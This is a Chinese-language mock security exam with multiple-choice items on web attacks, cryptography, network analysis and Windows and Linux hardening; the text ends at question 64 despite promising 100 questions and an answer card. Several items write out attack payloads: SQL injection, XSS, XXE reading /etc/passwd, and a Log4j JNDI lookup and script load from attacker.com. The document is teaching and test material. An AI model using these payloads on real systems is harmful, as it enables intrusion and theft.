# 全真模擬測驗 A 卷：資安客觀綜合 100 題（純試題本）

> **測驗規範事項**：  
> 1. 本試卷為**純題目卷**，共 100 道單選題（每題 1 分，滿分 100 分）。  
> 2. 測驗時間：**90 分鐘**。請於文末【標準答題卡】作答，作答完畢前**嚴禁翻閱答案卷**。  
> 3. 測驗涵蓋範圍：Web 應用安全、密碼學與身份驗證、網路協議分析、系統安全加固、逆向二進位、資安法規與治理、事件應變與鑑識。

---

## 領域一：Web 應用安全與 OWASP Top 10 (第 1 ~ 20 題)

### 第 1 題【Web安全 / SQL注入】
某管理員在審計 Web 伺服器訪問日誌時，發現以下請求參數：  
`id=1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'--+`  
此攻擊手法主要依賴何種特性來獲取非預期的資料庫結構？  
(A) 利用不同資料庫類型的字串串接語法差異  
(B) 利用 UNION 運算子要求前後查詢欄位數與型態相容之特性，拼湊跨表讀取  
(C) 觸發資料庫底層核心崩潰以洩漏記憶體頁面  
(D) 利用時間盲注中的 SLEEP() 函數測量伺服器延遲  

### 第 2 題【Web安全 / SQL盲注】
在無任何報錯與回顯內容的盲注環境中，攻擊者常利用條件表達式配合延遲函數來探測資料。下列哪一個 SQL 語句在 MySQL 環境下能成功達成「若資料庫名稱第一個字元 ASCII 碼為 115 則延遲 5 秒」之目的？  
(A) `SELECT IF(ascii(substr(database(),1,1))=115, sleep(5), 0);`  
(B) `SELECT WAITFOR DELAY '0:0:5' WHERE ascii(substr(database(),1,1))=115;`  
(C) `SELECT CASE WHEN substr(database(),1,1)='s' THEN pg_sleep(5) END;`  
(D) `SELECT BENCHMARK(5000000, MD5(1)) WHERE database() LIKE 's%';`  

### 第 3 題【Web安全 / 跨站腳本 XSS】
某網頁在顯示使用者個人暱稱時，未做任何過濾或編碼即直接輸出至 HTML 屬性中：`<input type="text" name="nickname" value="$userInput">`。若攻擊者輸入以下哪一組 Payload，能以最短長度且不依賴 `<script>` 標籤觸發 JavaScript 執行？  
(A) `" onfocus="alert(1)" autofocus="`  
(B) `<script>alert(1)</script>`  
(C) `javascript:alert(1)`  
(D) `&quot; onclick=&quot;alert(1)&quot;`  

### 第 4 題【Web安全 / XSS 防護機制】
現代瀏覽器普遍支援內容安全策略（Content Security Policy, CSP）。若某網站設定 HTTP 標頭：  
`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m';`  
攻擊者在 HTML 中成功注入以下哪段代碼時，**依然會被瀏覽器強制攔截而無法執行**？  
(A) `<script nonce="r4nd0m">console.log("Safe");</script>`  
(B) `<script src="https://attacker.com/evil.js"></script>`  
(C) `<script nonce="r4nd0m" src="/static/js/app.js"></script>`  
(D) `<script nonce="r4nd0m">fetch('/api/user');</script>`  

### 第 5 題【Web安全 / 伺服器端請求偽造 SSRF】
在進行 SSRF 漏洞利用時，若目標後端採用 `curl` 且支援多種協定，攻擊者常藉由哪一種協定直接向內網未授權的 Redis 伺服器發送多行 RESP 指令，進而寫入 WebShell 或 SSH 公鑰？  
(A) `dict://`  
(B) `gopher://`  
(C) `ldap://`  
(D) `tftp://`  

### 第 6 題【Web安全 / DNS Rebinding】
針對 SSRF 防禦中的「IP 黑名單校驗」（如檢查是否解析為 127.0.0.1 或 192.168.x.x），攻擊者常採用 DNS Rebinding 技術繞過。其核心原理為何？  
(A) 偽造 ARP 回應使伺服器將網關指向攻擊者 IP  
(B) 利用極短的 DNS TTL，使後端在校驗 IP 時解析為公網合法 IP，隨後發起業務請求時解析為內網私有 IP  
(C) 利用 HTTP 重定向 302 跳轉至私有 IP  
(D) 在 Host 標頭中注入換行字元 CRLF 竄改請求目的地  

### 第 7 題【Web安全 / 命令注入】
在 Linux 環境下的 Web 應用中，若參數直接拼接進 `system()` 函數，但系統過濾了「空格字元」，下列哪一個字元替換方案**無法**在 bash 環境下替代空格以維持命令語法完整？  
(A) `${IFS}`  
(B) `$IFS$9`  
(C) `<`（如 `cat</etc/passwd`）  
(D) `%20`（未經 URL 解碼直接傳入命令列時）  

### 第 8 題【Web安全 / PHP反序列化】
在 PHP 物件導向中，當一個物件被銷毀或腳本執行完畢時，會自動觸發的魔術方法（Magic Method）為何？  
(A) `__wakeup()`  
(B) `__destruct()`  
(C) `__toString()`  
(D) `__invoke()`  

### 第 9 題【Web安全 / Python反序列化】
Python 的 `pickle` 模組在進行反序列化（`pickle.loads`）時存在嚴重安全風險。攻擊者通常透過自訂類別中的哪一個魔術方法來定義反序列化時執行的任意系統命令？  
(A) `__reduce__()`  
(B) `__init__()`  
(C) `__call__()`  
(D) `__getattr__()`  

### 第 10 題【Web安全 / Java反序列化與JNDI】
在 Log4j2 遠端代碼執行漏洞（CVE-2021-44228）中，攻擊者構造的 lookup 語法 `${jndi:ldap://attacker.com/Exploit}` 能導致遠端類別載入執行的根本原因為何？  
(A) Log4j 預設解析日誌時啟用 JNDI 查詢，且在特定版本未對 LDAP/RMI 回傳的 codebase 與物件序列化內容進行反序列化限制  
(B) Log4j 使用了有漏洞的 XML 解析器導致 XXE 實體注入  
(C) Log4j 寫入檔案時觸發了緩衝區溢位  
(D) 攻擊者可藉由 JNDI 繞過作業系統的 root 權限檢查  

### 第 11 題【Web安全 / CSRF 與 Cookie 屬性】
為防範跨站請求偽造（CSRF），現代瀏覽器為 Cookie 引入了 `SameSite` 屬性。當 Cookie 設定為 `SameSite=Lax` 時，下列哪一種情境**會**攜帶此 Cookie 發送請求？  
(A) 第三方網站透過 `<iframe>` 嵌入目標網站發起的 POST 請求  
(B) 第三方網站使用 JavaScript `fetch()` 發起的跨域 POST 請求  
(C) 使用者在第三方網站點擊一般 `<a href="...">` 頂層導覽連結至目標網站的 GET 請求  
(D) 第三方網站透過 `<form method="POST">` 自動提交至目標網站  

### 第 12 題【Web安全 / CORS 配置錯誤】
若某 Web API 伺服器在響應 HTTP 請求時回傳以下標頭：  
`Access-Control-Allow-Origin: https://malicious.com`  
`Access-Control-Allow-Credentials: true`  
此配置帶來的安全威脅為何？  
(A) 攻擊者無法讀取響應，因為 CORS 只保護發送方  
(B) 攻擊者網站能透過前端腳本向目標 API 發起帶有使用者身分憑證（如 Cookie）的請求，並完整讀取敏感響應內容  
(C) 目標伺服器會強制被注入惡意 JavaScript 腳本  
(D) 攻擊者可以取得該 API 伺服器的 SSH root 連線  

### 第 13 題【Web安全 / 檔案上傳解析漏洞】
在 Apache HTTP Server 2.4.x 之前的特定版本中，若管理員設定 `AddHandler php5-script .php`，當攻擊者上傳名為 `shell.php.jpg` 的檔案時，伺服器可能將其當作 PHP 腳本執行。此特性的根源為何？  
(A) MIME 類型檢測混淆  
(B) Apache 從右至左解析副檔名，遇到未定義之 `.jpg` 繼續往左識別出 `.php` 並交由 PHP 解釋器處理  
(C) 檔案上傳時檔名末尾自動被截斷 `%00`  
(D) 圖片檔案的 EXIF 資訊被強制解析為二進位碼  

### 第 14 題【Web安全 / Nginx 目錄穿越配置】
在 Nginx 配置中，下列哪一種 `location` 與 `alias` 的搭配方式會導致嚴重的目錄穿越（Directory Traversal）漏洞，使外部訪客能存取目標目錄上一層的檔案？  
(A) `location /static/ { alias /app/static/; }`  
(B) `location /files { alias /app/files/; }`  
(C) `location /images/ { root /app/data; }`  
(D) `location ~ \.php$ { fastcgi_pass 127.0.0.1:9000; }`  

### 第 15 題【Web安全 / JWT 安全性】
JSON Web Token (JWT) 由 Header、Payload、Signature 三部分組成。在歷史漏洞中，攻擊者常利用「None 演算法攻擊」。該攻擊成功的前提條件為何？  
(A) 伺服器將 Header 中的 `"alg": "none"` 視為合法，且驗證簽章邏輯跳過了簽名核對  
(B) 密鑰長度小於 128 位元  
(C) Payload 未使用 Base64 進行編碼  
(D) 簽章中使用公鑰代替私鑰進行驗證  

### 第 16 題【Web安全 / JWT 密鑰混淆攻擊】
當 Web 服務使用非對稱加密（如 RS256，私鑰簽章、公鑰驗證）簽發 JWT，但後端驗證程式庫支援 HMAC（HS256）時，攻擊者若取得伺服器之公開金鑰（Public Key），可透過何種方式偽造管理員 Token？  
(A) 將 Header 中 `"alg"` 改為 `"HS256"`，並將伺服器公開金鑰作為對稱密鑰進行 HMAC-SHA256 簽名  
(B) 直接刪除 Signature 欄位並重送  
(C) 使用隨機產生的私鑰進行簽章並上傳新公鑰  
(D) 藉由長度擴展攻擊逆推原始私鑰  

### 第 17 題【Web安全 / 權限控制失效 IDOR】
使用者 A 登入後可透過 URL `GET /api/documents?doc_id=1024` 下載自己的帳單。若攻擊者修改參數為 `doc_id=1025` 即可直接下載使用者 B 的帳單，此漏洞屬於 OWASP Top 10 中的哪一類別？  
(A) A01:2021-Broken Access Control（權限控制失效 / 水平越權）  
(B) A02:2021-Cryptographic Failures（加密機制失效）  
(C) A03:2021-Injection（注入式攻擊）  
(D) A07:2021-Identification and Authentication Failures（認證與識別失效）  

### 第 18 題【Web安全 / 寬字節注入】
在 PHP 與 MySQL 搭配的環境中，若資料庫連線編碼為 GBK，當後端使用 `addslashes()` 將單引號轉義為 `\'`（十六進位 `5C 27`）時，攻擊者可輸入以下哪一個位元組序列，使其與 `5C` 結合成合法的雙字節漢字，進而「吃掉」反斜線並使單引號逃逸？  
(A) `%00`  
(B) `%df`  
(C) `%ff`  
(D) `%20`  

### 第 19 題【Web安全 / 伺服器端模板注入 SSTI】
在基於 Python Flask (Jinja2) 的 Web 應用中，若存在模板注入漏洞，攻擊者在輸入框輸入下列哪一個 Payload 時，最常被用來驗證 SSTI 的存在（回顯計算結果 49）？  
(A) `{{7*7}}`  
(B) `${7*7}`  
(C) `<%= 7*7 %>`  
(D) `#{7*7}`  

### 第 20 題【Web安全 / XML外部實體注入 XXE】
下列哪一段 XML 代碼片段展示了利用 SYSTEM 關鍵字讀取伺服器內部敏感檔案 `/etc/passwd` 的典型 XXE 攻擊宣告？  
(A) `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><user>&xxe;</user>`  
(B) `<!ELEMENT test (ANY)><!ENTITY xxe "/etc/passwd">`  
(C) `<xml><data src="/etc/passwd"/></xml>`  
(D) `<!DOCTYPE test [ <!ATTLIST user id CDATA "/etc/passwd"> ]>`  

---

## 領域二：密碼學與身份驗證機制 (第 21 ~ 35 題)

### 第 21 題【密碼學 / 分組密碼操作模式】
在進階加密標準（AES）的各類分組密碼模式中，下列哪一種模式**不具備**語意安全性（Semantic Security），相同的明文分組永遠會加密產生相同的密文分組，因而極易洩漏資料分佈模式（如企鵝點陣圖輪廓外洩）？  
(A) CBC (Cipher Block Chaining)  
(B) ECB (Electronic Codebook)  
(C) CFB (Cipher Feedback)  
(D) CTR (Counter)  

### 第 22 題【密碼學 / 填充預言機攻擊】
Padding Oracle 攻擊針對使用 PKCS#7 / PKCS#5 填充機制的區塊加密（如 AES-CBC）模式。攻擊者發動此攻擊的關鍵依據為何？  
(A) 伺服器回傳了私鑰的雜湊值  
(B) 伺服器針對「密文解密後填充無效」與「填充有效但內容錯誤」回傳了不同的錯誤響應或時間延遲  
(C) 密鑰長度固定為 128 位元  
(D) 初始化向量（IV）全部填滿為 0  

### 第 23 題【密碼學 / 現代認證加密 AEAD】
在傳輸層安全協議（TLS 1.3）中，強制要求使用具備認證功能的加密模式（AEAD）。下列哪一種 AES 操作模式屬於標準的 AEAD 模式，能夠同時保證資料的機密性與完整性？  
(A) AES-ECB  
(B) AES-CBC  
(C) AES-GCM (Galois/Counter Mode)  
(D) AES-OFB  

### 第 24 題【密碼學 / RSA 演算法原理】
在 RSA 公開金鑰密碼系統中，若公鑰為 $(n, e)$，私鑰為 $(n, d)$。已知兩個質數 $p = 61, q = 53$，則歐拉函數 $\phi(n)$ 的值應為多少？  
(A) 3233  
(B) 3120  
(C) 3174  
(D) 3286  

### 第 25 題【密碼學 / RSA 攻擊手法】
若兩個不同的使用者採用了相同的 RSA 模數 $n$，但使用了互質的公鑰指數 $e_1$ 與 $e_2$。當發送方將同一份明文訊息 $m$ 分別用這兩把公鑰加密並傳送時，竊聽者可使用何種數學演算法在已知密文 $c_1, c_2$ 與公鑰的情況下，無需分解 $n$ 即可完全還原明文 $m$？  
(A) 擴展歐幾里得演算法（共模攻擊 Common Modulus Attack）  
(B) 費馬小定理分解法  
(C) 狄利克雷卷積  
(D) 離散傅立葉變換  

### 第 26 題【密碼學 / 雜湊函數弱點】
MD5 與 SHA-1 演算法已被認定為密碼學上不安全，主要原因在於研究者已成功構造出何種攻擊？  
(A) 逆運算直接從雜湊值還原任意明文（原像攻擊）  
(B) 碰撞攻擊（Collision Attack，找到兩個不同訊息 $m_1 \neq m_2$ 使得 $H(m_1) = H(m_2)$）  
(C) 金鑰窮舉攻擊  
(D) 側信道能量分析  

### 第 27 題【密碼學 / 長度擴展攻擊】
基於 Merkle-Damgård 結構的雜湊函數（如 MD5, SHA-1, SHA-256）在特定實作下容易受到「長度擴展攻擊」（Length Extension Attack）。下列哪一種訊息認證碼構造方式**最容易**受到此攻擊威脅？  
(A) $\text{MAC}(m) = H(\text{key} \parallel m)$  
(B) $\text{HMAC}(m) = H((\text{key} \oplus \text{opad}) \parallel H((\text{key} \oplus \text{ipad}) \parallel m))$  
(C) $\text{KMAC}(m)$  
(D) $\text{MAC}(m) = H(m \parallel \text{key})$  

### 第 28 題【密碼學 / 密碼儲存安全】
在儲存使用者密碼雜湊時，若僅使用加鹽（Salt）的 SHA-256（如 `SHA256(password + salt)`），在現代硬體防護下依然容易遭受 GPU/ASIC 暴力破解。為抵抗硬體並行加速攻擊，業界推薦使用何種具備「記憶體硬性」（Memory-Hard）的密碼雜湊演算法？  
(A) MD5-Crypt  
(B) Argon2  
(C) SHA-384  
(D) DES-CBC  

### 第 29 題【密碼學 / 金鑰交換與前向保密】
在 SSL/TLS 連線中，若希望即使伺服器的長期私鑰在未來某天洩漏，攻擊者過去錄製的所有歷史通訊流量依然無法被解密，則必須採用具備何種特性的密鑰交換機制？  
(A) 靜態 RSA 金鑰交換  
(B) 完全前向保密（Perfect Forward Secrecy, PFS，如 ECDHE）  
(C) 預共用金鑰（PSK）  
(D) 固定 Diffie-Hellman (Static DH)  

### 第 30 題【密碼學 / 數位憑證與 PKI】
在 X.509 數位憑證驗證鏈結中，客戶端（如瀏覽器）如何驗證網站憑證未被偽造且確由受信任的憑證授權中心（CA）所核發？  
(A) 使用網站憑證中的公鑰解密該憑證的簽章  
(B) 使用核發該憑證之 CA 的公開金鑰，解密憑證上的數位簽章，並核對雜湊值是否一致  
(C) 將整張憑證上傳至 DNS 伺服器進行驗證  
(D) 檢查憑證的檔案名稱是否包含合法網域名稱  

### 第 31 題【密碼學 / 憑證吊銷機制】
當某網站的 SSL 私鑰洩漏時，管理員需向 CA 申請吊銷憑證。相較於傳統定期下載龐大「憑證吊銷清單」（CRL），現代瀏覽器更常使用何種即時協定查詢單張憑證的吊銷狀態？  
(A) SCEP (Simple Certificate Enrollment Protocol)  
(B) OCSP (Online Certificate Status Protocol)  
(C) ACME (Automated Certificate Management Environment)  
(D) LDAP (Lightweight Directory Access Protocol)  

### 第 32 題【身份驗證 / Kerberos 認證流程】
在 Windows Active Directory 網域環境使用的 Kerberos 認證協定中，客戶端在通過身分驗證服務（AS）後，取得的第一個關鍵憑證票據為何？  
(A) TGS (Ticket Granting Service)  
(B) TGT (Ticket Granting Ticket)  
(C) PAC (Privilege Attribute Certificate)  
(D) Service Ticket (ST)  

### 第 33 題【身份驗證 / 黃金票據攻擊】
在針對 Active Directory 域環境的滲透攻擊中，「黃金票據」（Golden Ticket）攻擊是攻擊者維持持久控制權的最高手段。攻擊者發動該攻擊前，必須竊取哪一個關鍵帳號的 NTLM Hash / AES 金鑰？  
(A) `Administrator`  
(B) `krbtgt`  
(C) `Guest`  
(D) `Domain Admins`  

### 第 34 題【身份驗證 / NTLM Relay 攻擊】
在區域網路中，若網域未強制啟用 SMB 簽章（SMB Signing），攻擊者誘使網域主機向偽造的 SMB 伺服器發起認證時，可利用何種工具與手法將身分驗證請求轉發至另一台伺服器，從而直接以受害主機身分執行程式碼？  
(A) Pass-the-Hash 攻擊  
(B) NTLM 中繼攻擊（NTLM Relay）  
(C) 密碼噴灑攻擊（Password Spraying）  
(D) Kerberoasting 攻擊  

### 第 35 題【身份驗證 / 多因素認證 MFA】
Google Authenticator 等雙因素驗證 APP 普遍採用的動態密碼標準是 TOTP（Time-Based One-Time Password，RFC 6238）。此演算法計算 6 位數一次性密碼時，依賴的兩項核心輸入資料為何？  
(A) 使用者密碼與隨機亂數  
(B) 預先共享的私密金鑰（Secret Key）與當前 Unix 時間戳除以時間步長（通常 30 秒）的計數值  
(C) 手機 IMEI 碼與簡訊驗證碼  
(D) 伺服器 IP 位址與使用者帳號名稱  

---

## 領域三：網路協議分析與封包取證 (第 36 ~ 50 題)

### 第 36 題【網路協議 / TCP 握手機制】
在標準的 TCP 三次握手建立連線過程中，客戶端向伺服器發送第一個封包（SYN 標誌置位），若初始序號為 $x$。伺服器正常回應的第二個封包中，其標誌位與確認序號（Acknowledgment Number）應為何？  
(A) SYN+ACK，確認序號為 $x$  
(B) SYN+ACK，確認序號為 $x+1$  
(C) ACK，確認序號為 $x+1$  
(D) RST，確認序號為 0  

### 第 37 題【網路協議 / TCP 狀態轉移】
主動發起關閉連線（Active Close）的一方，在發送最後一個 ACK 封包後，必須進入下列哪一個狀態並等待 $2\times\text{MSL}$（最大封包存活時間）的時間才能徹底釋放連線？  
(A) CLOSE_WAIT  
(B) TIME_WAIT  
(C) LAST_ACK  
(D) FIN_WAIT_2  

### 第 38 題【網路協議 / ARP 欺騙與防禦】
攻擊者在區域網路發送偽造的無故 ARP（Gratuitous ARP）應答，將網關 IP 映射至攻擊者自身 MAC 位址以實施中間人攻擊。在交換器（Switch）端防禦此類攻擊最有效的二層安全技術為何？  
(A) STP (Spanning Tree Protocol)  
(B) DAI (Dynamic ARP Inspection，搭配 DHCP Snooping)  
(C) 802.1Q VLAN 標籤劃分  
(D) RIP 路由協議  

### 第 39 題【網路協議 / DNS 放大攻擊】
DNS 分散式阻斷服務放大攻擊（DNS Amplification Attack）主要利用 UDP 協定的無狀態特性與偽造來源 IP。攻擊者發送哪一種類型的 DNS 查詢請求最容易獲得數十倍放大的回應封包？  
(A) `A` 記錄查詢  
(B) `ANY` 記錄查詢（搭配 EDNS0 大緩衝區支援）  
(C) `PTR` 反向解析查詢  
(D) `CNAME` 別名查詢  

### 第 40 題【網路協議 / DNSSEC 技術】
為防範 DNS 快取污染（DNS Cache Poisoning）與劫持，DNSSEC 引入了密碼學驗證機制。在 DNSSEC 記錄中，用來對特定資源記錄集（RRset）進行數位簽章的記錄類型為何？  
(A) DNSKEY  
(B) RRSIG  
(C) DS (Delegation Signer)  
(D) NSEC / NSEC3  

### 第 41 題【網路分析 / Wireshark 過濾語法】
若鑑識人員想在 Wireshark 中過濾出「來源或目的 IP 為 192.168.1.100，且包含 HTTP POST 請求」的所有封包，應輸入下列哪一條顯示過濾器（Display Filter）？  
(A) `ip.addr == 192.168.1.100 and http.request.method == "POST"`  
(B) `ip.host = 192.168.1.100 && http.method == POST`  
(C) `host 192.168.1.100 and tcp port 80`  
(D) `ip.src == 192.168.1.100 or http.post`  

### 第 42 題【網路取證 / 隱蔽通道技術】
在被嚴格管制的企業內網中，若所有對外 TCP 端口均被防火牆封鎖，但允許向外網合法遞歸解析 DNS，攻擊者常使用何種技術將敏感機密數據編碼後放置於 DNS 查詢子網域名稱中逐批外傳？  
(A) DNS 隧道隱寫（DNS Tunneling / Data Exfiltration）  
(B) ARP 毒化隧道  
(C) SSH 動態轉發  
(D) BGP 路由劫持  

### 第 43 題【網路分析 / TLS 握手特徵】
在 TLS 1.2 握手流程中，客戶端在發送的 `Client Hello` 訊息中，哪一個明文延伸欄位（Extension）會直接暴露出使用者嘗試連線的網站完整主機名稱（FQDN），常被網路防火牆用於阻擋特定網站？  
(A) ALPN (Application-Layer Protocol Negotiation)  
(B) SNI (Server Name Indication)  
(C) Key Share  
(D) Supported Versions  

### 第 44 題【網路分析 / TLS 1.3 進步特性】
相較於 TLS 1.2，TLS 1.3 在安全與連線延遲上有重大突破。下列關於 TLS 1.3 的敘述何者**錯誤**？  
(A) 完整握手往返時間從 2-RTT 縮減為 1-RTT，並支援 0-RTT 早期數據恢復  
(B) 徹底廢棄了靜態 RSA 金鑰交換與不安全的對稱加密（如 RC4、3DES、CBC 模式）  
(C) 將 Server Certificate 憑證訊息移入加密握手階段，不再以明文傳輸憑證內容  
(D) 依然保留了 MD5 與 SHA-1 作為握手雜湊完整性校驗算法  

### 第 45 題【網路分析 / 封包特徵識別】
在 Wireshark 分析封包時，若發現某一 TCP 連線中，發送端不斷發送負載極短的小封包，且 TCP 標誌中 PSH (Push) 旗標持續置位，隨後接收端立即回傳大量回顯字元，這種流量行為最符合下列哪一種應用程式？  
(A) 批次 FTP 大檔傳輸  
(B) 互動式遠端終端連線（如 Telnet 或反向互動 Shell）  
(C) 靜態網頁圖片下載  
(D) DNS 區域傳送（AXFR）  

### 第 46 題【網路分析 / SYN Flood 檢測】
當伺服器遭受大規模 SYN Flood 分散式阻斷服務攻擊時，網路管理員在伺服器上執行 `netstat -nat` 指令，將會觀察到哪一種狀態的 TCP 連線數量急劇暴增並耗盡連線池？  
(A) ESTABLISHED  
(B) SYN_RECV  
(C) FIN_WAIT_1  
(D) CLOSED  

### 第 47 題【網路協議 / HTTP/2 多路復用】
HTTP/2 相較於 HTTP/1.1 顯著提高了傳輸效能，主要歸功於下列哪一項核心架構改進？  
(A) 使用 UDP 作為底層傳輸協定  
(B) 在單一 TCP 連線上透過二進位分幀（Binary Framing）實現多路復用（Multiplexing），解決隊頭阻塞（Head-of-Line Blocking）  
(C) 停用所有 Cookie 機制以精簡傳輸  
(D) 強制要求所有請求均使用壓縮後的 JSON 格式  

### 第 48 題【網路協議 / HTTP 狀態碼意涵】
在 Web 應用安全測試中，當客戶端向伺服器發出請求時，伺服器回應狀態碼 `403 Forbidden` 與 `401 Unauthorized`，兩者的核心差異為何？  
(A) 401 表示身分未經認證（未登入或憑證無效），403 表示伺服器已識別身分但該身分無權存取該資源  
(B) 401 是伺服器端代碼崩潰，403 是客戶端網路中斷  
(C) 401 專指 API 逾時，403 專指密碼輸入錯誤過多次  
(D) 兩者意義完全相同，純粹由不同 Web 伺服器隨機挑選  

### 第 49 題【網路取證 / 封包切割與重組】
在乙太網路中，標準的最大傳輸單元（MTU）為 1500 位元組。當 IP 封包大小超過 MTU 且 DF (Don't Fragment) 標誌為 0 時，IP 標頭會進行分片處理。鑑識人員在拼裝分片封包時，主要依賴 IP 標頭中的哪三個欄位？  
(A) Identification（標識符）、Flags（標誌位）、Fragment Offset（分片偏移）  
(B) TTL、Protocol、Checksum  
(C) Source IP、Destination IP、Window Size  
(D) Version、IHL、Type of Service  

### 第 50 題【網路協議 / ICMP 隱蔽通道】
攻擊者常使用 `ptunnel` 或自編腳本將木馬連線數據封裝於 ICMP 協議中以繞過防火牆。此技術主要將有效載荷隱匿於 ICMP 報文的哪一個部分？  
(A) ICMP Type 欄位  
(B) ICMP Code 欄位  
(C) ICMP Data（負載資料區）  
(D) IP Checksum 欄位  

---

## 領域四：系統安全加固、Linux/Windows 權限與配置 (第 51 ~ 65 題)

### 第 51 題【Linux安全 / 特殊權限 SUID】
在 Linux 檔案系統中，當一個執行檔被賦予 SUID（Set UID）權限（如 `chmod u+s /usr/bin/find`）時，這代表何種執行行為？  
(A) 任何使用者執行該程式時，該行程將暫時獲得該檔案擁有者（Owner）的權限  
(B) 該程式只能由 root 使用者執行  
(C) 該程式在執行時會被防毒軟體即時沙箱隔離  
(D) 只有屬於該檔案群組的成員才能執行  

### 第 52 題【Linux安全 / Linux Capabilities】
傳統 Linux 只有 root (UID 0) 與一般使用者兩分法，為實踐最小權限原則，現代 Linux 核心引入了 Capabilities。若希望某自訂網路程式無需 root 即可監聽 80 端口，應賦予其哪一項 capability？  
(A) `CAP_NET_BIND_SERVICE`  
(B) `CAP_SYS_ADMIN`  
(C) `CAP_DAC_OVERRIDE`  
(D) `CAP_SETUID`  

### 第 53 題【Linux加固 / 密碼雜湊欄位】
在 Linux 系統的 `/etc/shadow` 檔案中，密碼欄位以 `$` 符號分隔。若某一行的密碼字串為 `$6$r9Jk3L...$...`，其中的 `$6$` 代表該密碼雜湊採用了哪一種演算法？  
(A) MD5  
(B) Blowfish  
(C) SHA-256  
(D) SHA-512  

### 第 54 題【Linux加固 / SSH 服務安全】
為加固 Linux 伺服器的 OpenSSH 服務，防止未授權密碼暴力破解與管理者帳號直登，管理員在 `/etc/ssh/sshd_config` 中最應配置的兩項安全指令為何？  
(A) `PermitRootLogin no` 與 `PasswordAuthentication no`（改用公鑰認證）  
(B) `Port 22` 與 `X11Forwarding yes`  
(C) `PermitEmptyPasswords yes` 與 `IgnoreRhosts no`  
(D) `UsePAM no` 與 `MaxAuthTries 100`  

### 第 55 題【Linux加固 / 防火牆 iptables】
在 Linux `iptables` 防火牆中，若要新增一條規則丟棄所有來自 IP `203.0.113.50` 對伺服器 22 端口（SSH）的 TCP 連線，應使用下列哪一條指令？  
(A) `iptables -A INPUT -p tcp -s 203.0.113.50 --dport 22 -j DROP`  
(B) `iptables -I OUTPUT -p tcp -d 203.0.113.50 --sport 22 -j REJECT`  
(C) `iptables -D FORWARD -s 203.0.113.50 -j ACCEPT`  
(D) `iptables -A PREROUTING -p udp -s 203.0.113.50 -j DROP`  

### 第 56 題【Linux安全 / 存取控制 SELinux】
在啟用 SELinux 的 Linux 系統中，若想暫時將 SELinux 切換為「僅記錄警告日誌但不實際阻擋違規操作」的寬容模式，管理員應執行哪一個指令？  
(A) `setenforce 0`  
(B) `setenforce 1`  
(C) `systemctl stop selinux`  
(D) `getenforce strict`  

### 第 57 題【Linux加固 / PAM 帳號防護】
為防禦 SSH 密碼字典暴力破解，Linux 可透過 PAM 模組設定「密碼連續錯誤 5 次則鎖定帳號 15 分鐘」。現代 Linux 系統（如 RHEL 8/9、Ubuntu 20.04+）普遍推薦配置哪一個 PAM 模組？  
(A) `pam_faillock.so` (或 `pam_tally2.so`)  
(B) `pam_rootok.so`  
(C) `pam_shells.so`  
(D) `pam_env.so`  

### 第 58 題【Windows安全 / UAC 使用者帳戶控制】
Windows 引入的 UAC（User Account Control）技術其核心設計目標為何？  
(A) 取代防毒軟體即時查殺惡意病毒  
(B) 讓即便是具有管理員身分的使用者，預設也僅以標準受限權限權杖（Standard Token）運行日常應用程式，唯有在需要高權限時才透過提示框請求提升（Elevation）  
(C) 自動將所有檔案使用 BitLocker 進行加密  
(D) 防止未經許可的遠端桌面 RDP 連線  

### 第 59 題【Windows加固 / 憑證保護 Credential Guard】
在 Windows 10/11 企業版與 Windows Server 2016+ 中，微軟引入了 Windows Defender Credential Guard。該技術主要利用何種底層機制將 LSASS 記憶體中的 NTLM Hash 與 Kerberos 票據隔離，防止 Mimikatz 進行提取？  
(A) 虛擬化型安全性（Virtualization-based Security, VBS）將認證資料存放在隔離的虛擬安全模式（VSM）中  
(B) 在硬碟上建立壓縮的加密備份  
(C) 停用 Windows 內建的所有密碼驗證功能  
(D) 透過防火牆全面封鎖 TCP 445 端口  

### 第 60 題【Windows加固 / SMB 安全與歷史漏洞】
2017 年席捲全球的 WannaCry 勒索軟體利用了「永恆之藍」（EternalBlue, MS17-010）漏洞進行蠕蟲式橫向傳播。該漏洞所影響的網路協定與加固阻斷措施為何？  
(A) 影響 RDP 協定，加固措施為停用 3389 端口  
(B) 影響 SMBv1 協定，加固措施為在 Windows 功能中徹底停用 SMBv1 並封鎖 TCP 445 端口  
(C) 影響 NetBIOS 協定，加固措施為停用 UDP 137  
(D) 影響 Kerberos 協定，加固措施為重置 krbtgt 密碼  

### 第 61 題【Windows安全 / Active Directory 群組原則】
在 Windows 網域管理中，群組原則物件（Group Policy Object, GPO）具有層級套用關係。當多個 GPO 之間產生設定衝突時，若無額外設定 Enforced，預設的覆蓋套用順序為何（後者覆蓋前者）？  
(A) 本機 (Local) -> 站台 (Site) -> 網域 (Domain) -> 組織單位 (OU)  
(B) 組織單位 (OU) -> 網域 (Domain) -> 站台 (Site) -> 本機 (Local)  
(C) 站台 (Site) -> 本機 (Local) -> 組織單位 (OU) -> 網域 (Domain)  
(D) 網域 (Domain) -> 組織單位 (OU) -> 本機 (Local) -> 站台 (Site)  

### 第 62 題【Windows加固 / 存取控制清單 ACL】
在 Windows NTFS 檔案系統安全架構中，用於定義「哪些使用者或群組擁有讀取、寫入、修改權限」的清單結構稱之為何？  
(A) SACL (System Access Control List，系統稽核存取控制清單)  
(B) DACL (Discretionary Access Control List，判別存取控制清單)  
(C) GDT (Global Descriptor Table)  
(D) SID (Security Identifier)  

### 第 63 題【Linux漏洞 / 核心競爭條件提權】
著名的「髒牛漏洞」（Dirty COW, CVE-2016-5195）是 Linux 核心中的一個嚴重本機提權漏洞。其漏洞根源為何？  
(A) 核心在處理記憶體寫入時複製（Copy-on-Write, COW）機制時存在競爭條件（Race Condition），允許一般使用者覆寫唯讀記憶體映射檔案（如 `/etc/passwd`）  
(B) SSH 服務的緩衝區溢位  
(C) Sudo 工具中未正確處理斜線路徑  
(D) Bash Shell 的環境變數解析錯誤  

### 第 64 題【系統加固 / 最小化攻擊面】
在伺服器安全基準（CIS Benchmark）規範中，對於剛安裝完成的作業系統，下列哪一項**不符合**安全加固最佳實踐？  
(A) 關閉並停用非必要的系統服務（如 Telnet, FTP, rsh）  
(B) 啟用並配置全盤加密（如 Linux LUKS / Windows BitLocker）  
(C) 為方便日常維護與跨團隊除錯，將常用管理員帳號設定為共用且取消密碼過期機制  
(D) 設定登入 Banner 提示「未授權存取將遭依法追究」，移除系統版本詳細資訊  

